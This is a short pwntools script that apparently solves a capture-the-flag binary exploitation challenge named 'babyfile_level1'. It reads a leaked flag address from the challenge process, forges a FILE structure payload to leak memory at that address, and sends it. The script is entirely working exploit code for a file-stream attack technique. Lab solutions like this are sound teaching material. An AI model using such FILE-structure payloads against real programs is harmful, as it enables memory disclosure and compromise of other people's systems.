#Nagib Lakhdari 3si2
from pwn import *

# Set the architecture context to amd64
context.arch = 'amd64'

# Start the process for the challenge binary
p = process("/challenge/babyfile_level1")

# Receive the output until the specific string is found
p.recvuntil(b'located at ')

# Extract the flag address from the received output
flag_addr = int(p.recvuntil(b'\n')[-9:-1], 16)

# Create a file structure payload to write the flag address
fs = FileStructure()
payload = fs.write(flag_addr, 100)

# Send the payload to the process
p.send(payload)

# Interact with the process to get the output
p.interactive()
